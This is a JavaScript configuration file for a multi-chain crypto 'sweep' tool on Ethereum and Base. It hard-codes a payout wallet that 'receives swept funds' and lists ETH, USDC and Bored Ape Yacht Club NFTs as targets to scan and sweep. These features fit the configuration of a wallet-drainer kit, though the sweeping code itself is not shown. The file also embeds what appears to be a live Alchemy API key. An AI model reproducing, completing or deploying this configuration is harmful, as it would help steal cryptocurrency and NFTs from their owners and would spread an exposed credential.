// network-manifest.js

/**
 * NETWORK MANIFEST - Hardened Multi-Chain Configuration (v9)
 * 
 * Key improvements:
 * - Uses isNativeGasToken flag instead of zero-address hack
 * - Clean separation between native tokens and contract-based assets
 * - Stronger validation
 * - Better maintainability
 */

export const networkManifest = {
    // Payout wallet that receives swept funds
    EVM_PAYOUT_TARGET: "0xf084c0c620c24d2a8c02f5630fb1aa7e0a9210e9",

    // Alchemy API Key (optional - only if you're using Alchemy)
    ALCHEMY_API_KEY: "Khs7bqnVFaoeltrODf4Bx",

    // Supported Networks
    networks: [
        {
            chainId: 1,
            name: "Ethereum",
            rpcUrls: [
                "https://rpc.ankr.com/eth",
                "https://eth.llamarpc.com",
                "https://1rpc.io/eth"
            ],
            multicallAddress: "0xcA11bde05977b3631167028862bE2a173976CA11",
            explorer: "https://etherscan.io",
            nativeCurrency: "ETH",
            maxGasMultiplier: 1.3,
        },
        {
            chainId: 8453,
            name: "Base",
            rpcUrls: [
                "https://mainnet.base.org",
                "https://rpc.ankr.com/base",
                "https://base.llamarpc.com"
            ],
            multicallAddress: "0xcA11bde05977b3631167028862bE2a173976CA11",
            explorer: "https://basescan.org",
            nativeCurrency: "ETH",
            maxGasMultiplier: 1.4,
        }
    ],

    // TARGET ASSETS TO SCAN / SWEEP
    targets: [
        // === NATIVE GAS TOKENS ===
        {
            id: "base-native-eth",
            chainId: 8453,
            isNativeGasToken: true,
            symbol: "ETH",
            metadata: {
                label: "Base Native Gas Token"
            }
        },

        // === ERC-20 TOKENS ===
        {
            id: "usdc-eth",
            chainId: 1,
            isNativeGasToken: false,
            contractAddress: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
            symbol: "USDC",
            metadata: {
                label: "USD Coin",
                decimals: 6
            }
        },

        // === NFTs (ERC-721) ===
        {
            id: "bayc",
            chainId: 1,
            isNativeGasToken: false,
            contractAddress: "0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d",
            symbol: "BAYC",
            metadata: {
                label: "Bored Ape Yacht Club",
                standard: "erc721"
            }
        }
    ]
};

// =============================================
// HELPER FUNCTIONS
// =============================================

/**
 * Returns a simple asset type string based on the target config.
 * Useful for logging or conditional logic.
 */
export function getAssetType(target) {
    if (target.isNativeGasToken) {
        return "native";
    }
    if (target.metadata?.standard === "erc721") {
        return "erc721";
    }
    return "erc20";
}

/**
 * Validates the entire network manifest configuration.
 */
export function validateManifest() {
    const { EVM_PAYOUT_TARGET, networks, targets } = networkManifest;

    // Validate payout address
    if (!EVM_PAYOUT_TARGET || EVM_PAYOUT_TARGET === "0x000000000000000000impossible") {
        console.warn("⚠️ WARNING: EVM_PAYOUT_TARGET is missing or invalid!");
    }

    if (!/^0x[a-fA-F0-9]{40}$/.test(EVM_PAYOUT_TARGET)) {
        throw new Error(`Invalid EVM_PAYOUT_TARGET address: ${EVM_PAYOUT_TARGET}`);
    }

    // Validate networks
    if (!networks || networks.length === 0) {
        throw new Error("No networks defined in networkManifest");
    }

    // Validate targets
    if (!targets || targets.length === 0) {
        console.warn("⚠️ No targets defined in networkManifest");
    }

    targets.forEach((target, index) => {
        if (typeof target.isNativeGasToken !== "boolean") {
            throw new Error(`Target #${index} (${target.id}) is missing isNativeGasToken boolean`);
        }

        if (target.isNativeGasToken) {
            if (target.contractAddress) {
                console.warn(`⚠️ Warning: Native target "${target.id}" should not have a contractAddress`);
            }
        } else {
            if (!target.contractAddress || !/^0x[a-fA-F0-9]{40}$/.test(target.contractAddress)) {
                throw new Error(`Invalid contractAddress in target #${index} (${target.id})`);
            }
        }
    });

    console.log(`✅ Network manifest validated successfully`);
    console.log(`   Networks: ${networks.length} | Targets: ${targets.length}`);
}

// Auto-validate in development
if (typeof process !== 'undefined' && process.env.NODE_ENV !== 'production') {
    validateManifest();
}

export default networkManifest;